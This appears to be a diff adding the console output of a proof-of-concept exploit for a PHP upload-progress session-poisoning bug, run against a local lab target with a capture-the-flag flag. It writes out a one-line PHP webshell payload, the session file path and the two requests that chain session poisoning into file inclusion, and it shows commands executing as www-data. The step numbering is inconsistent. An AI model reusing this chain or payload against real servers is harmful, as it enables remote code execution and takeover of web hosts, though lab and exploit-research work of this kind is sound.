@@ -1,0 +1,23 @@
+======================================================================
+PoC CVE-2026-109619 - upload-progress session poisoning -> include -> RCE
+======================================================================
+[*] target     : http://127.0.0.1:8088/
+[*] session id : 2268254214d30d7625339db0b375758f
+[*] payload    : <?php system($_GET['c']);?>
+[*] save path  : /var/lib/php/sessions
+
+[1/2] POST /index.php  (multipart, Cookie: PHPSESSID=2268254214d30d7625339db0b375758f)
+      -> HTTP 200
+
+[3/4] GET view.php?tpl=/var/lib/php/sessions/sess_2268254214d30d7625339db0b375758f
+      -> HTTP 200
+
+[4] server response (payload executed inside the include):
+----------------------------------------------------------------------
+upload_progress___P2S_50d1dcb6__
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+flag{php2shell_lab_109619_chain}
+|a:5:{s:10:"start_time";i:1792584156;s:14:"content_length";i:4383;s:15:"bytes_processed";i:4383;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:5:"image";s:4:"name";s:9:"pixel.png";s:8:"tmp_name";s:27:"/tmp/php6mp5jg796f0efjhpWS2";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792584156;s:15:"bytes_processed";i:4104;}}}
+----------------------------------------------------------------------
+
+[+] PASS: remote code execution confirmed as the web user.
